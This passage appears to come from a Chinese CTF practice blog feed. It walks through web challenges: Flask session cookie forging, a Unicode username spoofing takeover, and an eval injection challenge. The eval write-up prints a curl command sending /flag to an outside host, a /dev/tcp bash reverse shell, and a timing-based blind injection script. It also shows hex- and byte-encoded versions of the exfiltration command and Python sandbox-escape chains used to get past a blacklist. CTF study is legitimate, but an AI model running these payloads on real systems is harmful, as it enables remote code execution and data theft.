class="string">"user_id"</span>:<span class="string">"10"</span>&#125;'</span><br></pre></td></tr></table></figure><p>  然后源码中有SECRET_KEY</p><p>  <img src="/2020/06/6月刷题记录/image-20200622144648942.png" alt="image-20200622144648942"></p>  <figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -t "&#123;<span class="string">'_fresh'</span>: True,<span class="string">'_id'</span>: b<span class="string">'3c9bf41ce8da824a4b374e1bf8d08aaaf2fbae2a5763a8298e1a83fc14ef844125ef2fec9970b04cfc92bdc5f5ac482b0afdc6c09387de2de3d5be1ea610c25c'</span>,<span class="string">'csrf_token'</span>:b<span class="string">'fa1efe1044dd827b8e2de5d654099252d4b78144'</span>,<span class="string">'image'</span>:b<span class="string">'0Vt6'</span>,<span class="string">'name'</span>:<span class="string">'admin'</span>,<span class="string">'user_id'</span>:<span class="string">'10'</span>&#125;" -s ckj123</span><br><span class="line">.eJxFUE1rwkAQ_Stlzh5WgxfBgxCzRJgJho3L7EWsxmSTjIWomET8700ttId3eo_39YT9uc2vJSxu7T2fwN6fYPGEj09YAM5wzsIKLTWJTsskjBWb1ONwVM5E3lVljWFZso0ExXm2Wc8mC6iiH-080VnHphicYEd6J0m4VWjiqbPcO9lViakD1PGDNAkPdc-SVmR5yhZVEm486kicxhkPqzkOReB01o8YXLjzY37DhjvU2JPFJbwmcLy25_3tq84vfxOcrDtnXYNmpUin9Vgr4KpsUNKG7HZGZvsYa_RkNjXpOEjCtaLV8m3n5VDk_2dETlHxy1wOMhJwOIm_wATu17x9_wZTBa9vTipsnw.XvhesQ.opeFEuwbfnBJs_j3BEQR_eCGvXE</span><br></pre></td></tr></table></figure></li></ul><pre><code>用这个cookie访问 即可得到flag</code></pre><ul><li><p>Unicode欺骗</p><p>  源码中显示，各种操作前都会对用户名进行自定义的strlower</p>  <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span></span><span class="symbol">:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>  nodeprep.prepare对应的库是Twisted，requirements.txt中显示Twisted==10.2.0</p><p>  版本非常老。</p><p>  unicode问题，对于一些特殊字符，nodeprep.prepare会进行如下操作</p>  <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬ -&gt; A -&gt; a</span><br></pre></td></tr></table></figure><p>  即第一次将其转换为大写，第二次将其转换为小写</p><p>  那么，攻击链大概就这样</p><ul><li>注册用户ᴬdmin</li><li>登录用户ᴬdmin，变成Admin</li><li>修改密码Admin，更改了admin的密码</li></ul></li></ul><h3 id="8-DASCTF-六月赛-简单的计算题"><a href="#8-DASCTF-六月赛-简单的计算题" class="headerlink" title="8.[DASCTF 六月赛]简单的计算题"></a>8.<strong>[DASCTF 六月赛]简单的计算题</strong></h3><p>最开始的源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request,session</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> create</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## flag is in /flag try to get it</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(string)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"or"</span> <span class="keyword">in</span> string:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"hack"</span></span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        input = request.form[<span class="string">'input'</span>]</span><br><span class="line">        create_question = create()</span><br><span class="line">        input_question = session.get(<span class="string">'question'</span>)</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"Invalid session please try again!"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"hack"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(input_question + <span class="string">"="</span> + str(input))))</span><br><span class="line">            <span class="keyword">if</span> calc_result == <span class="string">'True'</span>:</span><br><span class="line">                result = <span class="string">"Congratulations"</span></span><br><span class="line">            <span class="keyword">elif</span> calc_result == <span class="string">'False'</span>:</span><br><span class="line">                result = <span class="string">"Error"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=result,question=create_question)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        create_question = create()</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,question=create_question)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">"app.py"</span>, <span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>只过滤了 <code>or</code> ,因为不是直接回显，所以考虑盲注，但是也可以反弹shell，curl外带</p><p>curl外带</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234</span>|<span class="built_in">os</span>.<span class="built_in">popen</span>(<span class="string">'cat /flag | curl http://1.1.1.1:2333 --data-binary @-'</span>).<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/6月刷题记录/image-20200628174548750.png" alt="image-20200628174548750"></p><p>反弹shell</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">1234</span>|<span class="selector-tag">open</span>(<span class="string">'/tmp/c.sh'</span>,<span class="string">'w'</span>)<span class="selector-class">.write</span>(<span class="string">'/bin/bash -i &gt; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1'</span>),<span class="selector-tag">os</span><span class="selector-class">.system</span>(<span class="string">'/bin/bash /tmp/c.sh'</span>)</span><br></pre></td></tr></table></figure><p>盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = <span class="string">"abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"DASCTF"</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">    url = <span class="string">"http://183.129.189.60:10026/"</span></span><br><span class="line">    data=&#123;<span class="string">'input'</span>:<span class="string">'1234|os.system(\'cat /flag|grep &#123;&#125; &amp;&amp; sleep 2\')'</span>.format(payload + i)&#125;</span><br><span class="line">    print(data)</span><br><span class="line">    first = time.time()</span><br><span class="line">    r = requests.post(url=url,data=data)</span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line">    second = time.time()</span><br><span class="line">    offset = second-first</span><br><span class="line">    <span class="keyword">if</span> offset &gt; <span class="number">2</span>:</span><br><span class="line">        payload = payload+i</span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>后面题目下线了，听说是被<code>os.system()</code>打穿了</p><h3 id="9-DASCTF-六月赛-简单的计算题2"><a href="#9-DASCTF-六月赛-简单的计算题2" class="headerlink" title="9.[DASCTF 六月赛]简单的计算题2"></a>9.<strong>[DASCTF 六月赛]简单的计算题2</strong></h3><p>其他和1一样，但过滤更严格了</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.<span class="keyword">method</span><span class="operator"> == </span>'POST':</span><br><span class="line">        input = request.form<span class="literal">['<span class="identifier">input</span>']</span></span><br><span class="line">        create_question = create<span class="literal">()</span></span><br><span class="line">        input_question = session.get('question')</span><br><span class="line">        session<span class="literal">['<span class="identifier">question</span>']</span> = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question<span class="operator"> == </span>None:</span><br><span class="line">            return render<span class="constructor">_template('<span class="params">index</span>.<span class="params">html</span>', <span class="params">answer</span>=<span class="string">"Invalid session please try again!"</span>, <span class="params">question</span>=<span class="params">create_question</span>)</span></span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            return render<span class="constructor">_template('<span class="params">index</span>.<span class="params">html</span>', <span class="params">answer</span>=<span class="string">"hack"</span>, <span class="params">question</span>=<span class="params">create_question</span>)</span></span><br><span class="line">        calc_str = input_question + <span class="string">"="</span> + str(input)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(calc_str)))</span><br><span class="line">        except Exception <span class="keyword">as</span> ex:</span><br><span class="line">            calc_result = <span class="string">"Invalid"</span></span><br><span class="line">        return render<span class="constructor">_template('<span class="params">index</span>.<span class="params">html</span>', <span class="params">answer</span>=<span class="params">calc_result</span>,<span class="params">question</span>=<span class="params">create_question</span>)</span></span><br></pre></td></tr></table></figure><p>后面爬下来的黑名单</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">black_list</span> = [ <span class="string">'os'</span>, <span class="string">'mro'</span>, <span class="string">'request'</span>, <span class="string">'args'</span>, <span class="string">'eval'</span>, <span class="string">'system'</span>,<span class="string">'if'</span>, <span class="string">'for'</span>,<span class="string">'subprocess'</span>, <span class="string">'file'</span>, <span class="string">'builtins'</span>,<span class="string">'compile'</span>,<span class="string">'execfile'</span>,<span class="string">'from_pyfile'</span>,<span class="string">'config'</span>,<span class="string">'local'</span>,<span class="string">'self'</span>,<span class="string">'enter'</span>,<span class="string">'%'</span>,<span class="string">'or'</span>,<span class="string">'ls'</span>,<span class="string">'sys'</span>,<span class="string">'globals'</span>,<span class="string">'read'</span>,<span class="string">'popen'</span>]</span><br></pre></td></tr></table></figure><ul><li>但 <code>exec</code>没被禁所以和1一样，但 <code>exec</code>返回为空所以用<code>,</code>分割</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">"os.system('cat /flag | curl http://1.1.1.1:2333 --data-binary @-')"</span></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    payload += str(ord(i))+<span class="string">','</span></span><br><span class="line">print(payload)</span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    payload += str(hex(ord(i))).replace(<span class="string">"0x"</span>,<span class="string">""</span>).zfill(<span class="number">2</span>)</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>,exec(<span class="string">'o'</span>+<span class="string">'s.sy'</span>+<span class="string">'stem("sleep 10")'</span>)  <span class="comment">//明显延时了</span></span><br><span class="line"><span class="number">1</span>,exec(bytes([<span class="number">111</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">40</span>, <span class="number">39</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">32</span>, <span class="number">124</span>, <span class="number">32</span>, <span class="number">99</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">32</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">49</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">45</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">45</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">45</span>, <span class="number">39</span>, <span class="number">41</span>]).decode()) <span class="comment">//curl外带</span></span><br><span class="line"><span class="number">1</span>,exec(bytes.fromhex(<span class="string">'6f732e73797374656d2827636174202f666c6167207c206375726c20687474703a2f2f312e312e312e313a32333333202d2d646174612d62696e61727920402d2729'</span>))</span><br></pre></td></tr></table></figure><ul><li><p>利用继承链</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],<span class="string">'__cla'</span>+<span class="string">'ss__'</span>),<span class="string">'__mr'</span>+<span class="string">'o__'</span>)[<span class="number">1</span>],<span class="string">'__subclas'</span>+<span class="string">'ses__'</span>)()[<span class="number">104</span>],<span class="string">'__init__'</span>),<span class="string">'__glob'</span>+<span class="string">'al'</span>+<span class="string">'s__'</span>)[<span class="string">'sy'</span>+<span class="string">'s'</span>],<span class="string">'mod'</span>+<span class="string">'ules'</span>)[<span class="string">'o'</span>+<span class="string">'s'</span>],<span class="string">'sy'</span>+<span class="string">'ste'</span>+<span class="string">'m'</span>)(<span class="string">'l'</span>+<span class="string">'s'</span>)//绕waf</span><br></pre></td></tr></table></figure></li><li><p>字符拼接</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">"o"</span>+<span class="string">"s.s"</span>+<span class="string">"y"</span>+<span class="string">"s"</span>+<span class="string">"t"</span>+<span class="string">"e"</span>+<span class="string">"m('wh"</span>+<span class="string">"oa"</span>+<span class="string">"m"</span>+<span class="string">"i')"</span>)</span><br><span class="line">exec(<span class="string">"o"</span>+<span class="string">"s.s"</span>+<span class="string">"y"</span>+<span class="string">"s"</span>+<span class="string">"t"</span>+<span class="string">"e"</span>+<span class="string">"m('wh"</span>+<span class="string">"oa"</span>+<span class="string">"m"</span>+<span class="string">"i')"</span>)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; class=&quot;aplayer-secondary-script-marker&quot;&gt;&lt;/script&gt;&lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;1-某师傅出的招新题&quot;&gt;&lt;a href=&quot;#1-某师傅出的招新题&quot; class=&quot;headerlink&quot; title=&quot;1.某师傅出的招新题&quot;&gt;&lt;/a&gt;1.某师傅出的招新题&lt;/h3&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/** &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;Flag in flag.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;You can use &quot;readfile&quot; function.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;**/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;TestClass&lt;/span&gt; &lt;/span&gt;&amp;#123; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;show_source(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$str1 = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;str1&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$str2 = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;str2&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$rce = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; $str2(&lt;span class=&quot;string&quot;&gt;&#39;TestClass&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$a = $rce-&amp;gt;$str1();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$st1 = $_POST[&lt;span class=&quot;string&quot;&gt;&#39;st1&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$st2 = $_POST[&lt;span class=&quot;string&quot;&gt;&#39;st2&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($st1==&lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;&amp;amp;&amp;amp;$st2==&lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;GET!!!&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $z = substr($a,$st1,&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $x = substr($a,$st2,&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; $z.&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;br&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; $x.&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;br&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $z($x);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="刷题" scheme="https://0xcreed.jxustctf.top/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>NPUCTF-复现</title>
    <link href="https://0xcreed.jxustctf.top/2020/05/NPUCTF2020-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://0xcreed.jxustctf.top/2020/05/NPUCTF2020-%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-05-26T09:33:26.000Z</published>
    <updated>2020-06-06T12:42:18.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-web🐕"><a href="#1-web🐕" class="headerlink" title="1.web🐕"></a>1.web🐕</h3><p>当时写这道题，知道只知道是CBC字节反转攻击。</p><p>后面看WP才发现考点</p><ol><li>cbc padding oracle</li><li>cbc 字节翻转</li></ol><p>index.php源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);  <span class="comment">//定义加密方式</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, $key);    <span class="comment">//定义密钥</span></span><br><span class="line">define(<span class="string">"IV"</span>,<span class="string">"6666666666666666"</span>);    <span class="comment">//定义初始向量 16个6</span></span><br><span class="line">define(<span class="string">"BR"</span>,<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))header(<span class="string">'location:./index.php?source=1'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"--------encrypt---------"</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'IV:'</span>.$iv.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span 